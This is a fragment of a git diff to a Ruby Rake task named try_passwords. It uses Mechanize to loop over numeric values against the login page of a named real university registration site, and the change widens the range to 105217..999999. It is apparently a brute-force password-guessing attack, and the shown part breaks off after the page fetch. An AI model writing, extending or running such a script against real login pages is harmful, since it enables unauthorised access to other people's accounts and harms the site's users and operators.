@@ -1,5 +1,5 @@
 task try_passwords: :environment do
-	(100000..300000).each do |i|
+	(105217..999999).each do |i|
 		a = Mechanize.new{ |agent| agent.follow_meta_refresh = true }
 		a.get('https://alexreg.aast.edu/aastreg/frm_login.aspx') do |page|
 			@z = page
